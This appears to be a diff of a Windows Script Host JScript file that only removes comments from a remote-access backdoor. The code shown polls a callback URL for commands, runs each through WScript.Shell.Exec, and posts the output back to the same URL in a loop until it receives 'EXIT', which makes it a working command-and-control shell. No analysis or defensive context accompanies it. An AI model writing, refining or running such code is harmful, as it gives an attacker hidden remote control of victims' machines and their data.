@@ -8,7 +8,7 @@ function main() {
 
     while (!breakLoop) {
         try {
-            // Create an XMLHTTP request to send a GET request to the callback URL
+            
             var httpRequest = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
             httpRequest.open("GET", callbackUrl, false);
             httpRequest.send();
@@ -18,18 +18,18 @@ function main() {
             if (command.indexOf("EXIT") !== -1) {
                 breakLoop = true;
             } else {
-                // Execute the command
+               
                 var shell = new ActiveXObject("WScript.Shell");
                 var exec = shell.Exec(command);
                 var result = "";
 
-                // Read the output of the command
+                
                 while (exec.Status === 0) {
-                    WScript.Sleep(100); // Wait for the command to finish
+                    WScript.Sleep(100);
                 }
                 result = exec.StdOut.ReadAll();
 
-                // Send the result back to the callback URL
+                
                 var postRequest = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
                 postRequest.open("POST", callbackUrl, false);
                 postRequest.setRequestHeader("Content-Type", "text/plain");
